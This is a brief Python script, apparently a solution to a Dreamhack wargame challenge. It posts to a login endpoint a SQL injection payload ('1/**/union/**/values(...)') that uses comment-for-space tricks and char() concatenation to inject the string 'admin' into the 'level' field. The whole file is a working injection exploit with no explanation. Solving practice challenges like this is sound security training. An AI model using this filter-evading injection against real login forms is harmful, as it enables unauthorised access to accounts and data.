from requests import post

pay = '1/**/union/**/values(char(0x61)||char(0x64)||char(0x6d)||char(0x69)||char(0x6e))'

tmp = post(url="http://host3.dreamhack.games:20557/login", data={"uid":"x", "upw":"x", "level":f"{pay}"})

print(tmp.text)